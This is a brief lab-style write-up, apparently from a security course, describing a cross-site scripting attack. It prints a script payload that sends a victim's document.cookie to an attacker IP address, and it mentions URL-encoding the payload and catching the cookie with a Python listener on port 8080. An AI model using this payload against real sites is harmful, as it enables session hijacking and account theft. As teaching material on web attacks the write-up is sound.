For our attack url, we formatted the javascript as follows (unencoded):
<script>window.open('http://192.169.1.1/collect?cookie='+document.cookie)</script>

We found that this would not work, so we url encoded the string. We used the encoder of this page: http://www.w3schools.com/tags/ref_urlencode.asp

After that, the cookie was sent to our machine where we had a python program listening.

Please note that for our attack we used port 8080. This was done to avoid having to run the collection program with sudo permissions.
